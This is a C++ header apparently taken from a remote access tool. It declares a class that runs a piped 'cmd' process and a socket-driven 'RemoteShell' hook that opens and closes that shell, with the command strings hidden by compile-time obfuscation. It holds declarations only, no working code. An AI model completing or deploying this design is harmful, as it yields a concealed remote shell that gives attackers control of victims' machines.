#pragma once
#include "common.h"
#include "Hook.h"

#define CMD_START_SHELL std::string{AY_OBFUSCATE("cmd")}
#define CMD_STOP_SHELL std::string{AY_OBFUSCATE("exit")}

class CMD
{
	public: //Public functions
		CMD(const std::string &path);
		~CMD();
		static void cmdThread(void* pvPath);

		std::string readCMD();
		void writeCMD(std::string &command);

	private: 
		//Private functions
		void createChildProcess(const std::string &path);

		//variables
		HANDLE g_hChildStd_IN_Rd = NULL;
		HANDLE g_hChildStd_IN_Wr = NULL;
		HANDLE g_hChildStd_OUT_Rd = NULL;
		HANDLE g_hChildStd_OUT_Wr = NULL;

		static HANDLE g_hChildProcess;
		static HANDLE g_hChildThread;

		SECURITY_ATTRIBUTES saAttr;
};

class RemoteShell : public Hook
{
	public:
		//handle the hooks : start or stop handleshell thread
		void HandleHook(SOCKET s, const std::string &hook);

		//var
		static CMD* shell;
		static bool cmdOpen;


	private:
		static HANDLE _handle_shell_thread;
};

